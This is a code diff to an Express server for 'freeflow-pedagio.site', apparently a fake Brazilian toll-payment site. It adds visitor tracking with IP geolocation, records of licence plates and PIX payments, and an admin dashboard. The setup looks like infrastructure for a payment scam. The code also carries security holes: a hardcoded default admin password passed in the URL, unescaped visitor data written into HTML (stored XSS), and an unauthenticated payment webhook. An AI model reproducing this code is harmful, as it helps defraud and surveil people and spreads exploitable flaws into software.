@@ -193,12 +193,159 @@ app.get('/api/veiculos', requireInternalKey, async (req, res) => {
 // ---------- WEBHOOK ----------
 app.post('/api/webhook', (req, res) => {
     const data = req.body || {};
-    console.log('[WEBHOOK]', JSON.stringify({
-        payment_code: data.payment_code, payment_status: data.payment_status,
-        payment_method: data.payment_method, external_code: data.external_code,
-        timestamp: new Date().toISOString(),
-    }));
+    // Update payment event if exists
+    const code = data.payment_code || data.external_code || '';
+    if (data.payment_status === 'approved' && code) {
+        const ev = events.find(e => e.pixCode === code || (e.externalCode && e.externalCode === data.external_code));
+        if (ev) { ev.pago = true; ev.pagoEm = new Date().toISOString(); }
+    }
     res.json({ received: true });
+});
+
+// ---------- TRACKING ----------
+const events = [];
+const MAX_EVENTS = 5000;
+
+app.post('/api/track', async (req, res) => {
+    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress || '';
+    const ua = req.headers['user-agent'] || '';
+    const { tipo, pagina, placa, valor, pixCode, externalCode } = req.body || {};
+
+    let geo = {};
+    try {
+        const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=country,regionName,city,lat,lon,isp,query`);
+        if (geoRes.ok) geo = await geoRes.json();
+    } catch (_) {}
+
+    const ev = {
+        id: Date.now() + Math.random(),
+        tipo: tipo || 'visita',
+        pagina: pagina || '',
+        ip,
+        pais: geo.country || '',
+        estado: geo.regionName || '',
+        cidade: geo.city || '',
+        lat: geo.lat || null,
+        lon: geo.lon || null,
+        isp: geo.isp || '',
+        ua,
+        placa: placa || '',
+        valor: valor || null,
+        pixCode: pixCode || '',
+        externalCode: externalCode || '',
+        pago: false,
+        pagoEm: null,
+        ts: new Date().toISOString(),
+    };
+
+    events.unshift(ev);
+    if (events.length > MAX_EVENTS) events.pop();
+
+    res.json({ ok: true });
+});
+
+// ---------- PAINEL ADMIN ----------
+const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'Br@sil2019';
+
+app.get('/painel', (req, res) => {
+    const { senha } = req.query;
+
+    if (senha !== ADMIN_PASSWORD) {
+        return res.send(`<!DOCTYPE html><html lang="pt-BR"><head><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Acesso restrito</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:system-ui,sans-serif;background:#0f172a;display:flex;align-items:center;justify-content:center;min-height:100vh}
+.box{background:#1e293b;border-radius:16px;padding:40px 32px;width:min(360px,92vw);box-shadow:0 20px 60px #0008}
+h2{color:#fff;font-size:20px;margin-bottom:24px;text-align:center}
+input{width:100%;background:#0f172a;border:1px solid #334155;border-radius:8px;padding:12px 14px;color:#fff;font-size:15px;outline:none;margin-bottom:16px}
+input:focus{border-color:#6366f1}
+button{width:100%;background:#6366f1;color:#fff;border:none;border-radius:8px;padding:13px;font-size:15px;font-weight:700;cursor:pointer}
+button:hover{background:#4f46e5}.err{color:#f87171;font-size:13px;text-align:center;margin-top:10px;display:none}
+</style></head><body>
+<div class="box">
+  <h2>🔒 Painel Admin</h2>
+  <form id="f">
+    <input type="password" id="pw" placeholder="Senha" autocomplete="off">
+    <button type="submit">Entrar</button>
+    <p class="err" id="err">Senha incorreta</p>
+  </form>
+</div>
+<script>
+document.getElementById('f').addEventListener('submit',function(e){
+  e.preventDefault();
+  const pw=document.getElementById('pw').value;
+  if(pw)window.location.href='/painel?senha='+encodeURIComponent(pw);
+  else{document.getElementById('err').style.display='block';}
+});
+</script></body></html>`);
+    }
+
+    // Stats
+    const total = events.length;
+    const visitas = events.filter(e => e.tipo === 'visita').length;
+    const pixGerados = events.filter(e => e.tipo === 'pix_gerado').length;
+    const pagamentos = events.filter(e => e.pago || e.tipo === 'pagamento_confirmado').length;
+    const uniqueIPs = new Set(events.map(e => e.ip)).size;
+
+    const rows = events.slice(0, 200).map(ev => `
+    <tr>
+      <td>${new Date(ev.ts).toLocaleString('pt-BR')}</td>
+      <td><span class="badge badge-${ev.tipo}">${ev.tipo}</span></td>
+      <td>${ev.pagina}</td>
+      <td>${ev.placa || '—'}</td>
+      <td>${ev.valor ? 'R$ ' + parseFloat(ev.valor).toFixed(2).replace('.',',') : '—'}</td>
+      <td>${ev.pago ? '✅ Sim' : '—'}</td>
+      <td>${ev.ip}</td>
+      <td>${ev.cidade}${ev.estado ? ', '+ev.estado : ''}${ev.pais ? ' ('+ev.pais+')' : ''}</td>
+      <td style="font-size:11px;max-width:180px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="${ev.ua}">${ev.ua}</td>
+    </tr>`).join('');
+
+    res.send(`<!DOCTYPE html><html lang="pt-BR"><head><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Painel Admin</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:system-ui,sans-serif;background:#0f172a;color:#e2e8f0;min-height:100vh}
+.top{background:#1e293b;padding:16px 24px;display:flex;align-items:center;gap:16px;border-bottom:1px solid #334155}
+.top h1{font-size:18px;font-weight:700}
+.top a{margin-left:auto;color:#94a3b8;font-size:13px;text-decoration:none}
+.top a:hover{color:#fff}
+.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:16px;padding:24px}
+.stat{background:#1e293b;border-radius:12px;padding:20px;border:1px solid #334155}
+.stat .n{font-size:32px;font-weight:900;color:#6366f1}
+.stat .l{font-size:13px;color:#94a3b8;margin-top:4px}
+.wrap{padding:0 24px 40px;overflow-x:auto}
+table{width:100%;border-collapse:collapse;font-size:13px;min-width:900px}
+th{background:#1e293b;padding:10px 12px;text-align:left;color:#94a3b8;font-weight:600;border-bottom:1px solid #334155;position:sticky;top:0}
+td{padding:10px 12px;border-bottom:1px solid #1e293b;vertical-align:middle}
+tr:hover td{background:#1e293b}
+.badge{display:inline-block;padding:2px 8px;border-radius:999px;font-size:11px;font-weight:700}
+.badge-visita{background:#1e3a5f;color:#60a5fa}
+.badge-pix_gerado{background:#1a3a2a;color:#4ade80}
+.badge-pagamento_confirmado{background:#2d1b4e;color:#a78bfa}
+h2{padding:0 24px 16px;font-size:15px;color:#94a3b8}
+</style></head><body>
+<div class="top">
+  <h1>📊 Painel Admin — freeflow-pedagio.site</h1>
+  <a href="/painel?senha=${encodeURIComponent(ADMIN_PASSWORD)}">↻ Atualizar</a>
+</div>
+<div class="stats">
+  <div class="stat"><div class="n">${total}</div><div class="l">Total de eventos</div></div>
+  <div class="stat"><div class="n">${visitas}</div><div class="l">Visitas</div></div>
+  <div class="stat"><div class="n">${uniqueIPs}</div><div class="l">IPs únicos</div></div>
+  <div class="stat"><div class="n">${pixGerados}</div><div class="l">PIX gerados</div></div>
+  <div class="stat"><div class="n">${pagamentos}</div><div class="l">Pagamentos confirmados</div></div>
+</div>
+<h2>Últimos 200 eventos</h2>
+<div class="wrap">
+<table>
+<thead><tr>
+  <th>Data/Hora</th><th>Tipo</th><th>Página</th><th>Placa</th><th>Valor</th><th>Pago</th><th>IP</th><th>Localização</th><th>Navegador</th>
+</tr></thead>
+<tbody>${rows || '<tr><td colspan="9" style="text-align:center;padding:40px;color:#64748b">Nenhum evento ainda</td></tr>'}</tbody>
+</table>
+</div>
+</body></html>`);
 });
 
 // ---------- HEALTH (hidden) ----------
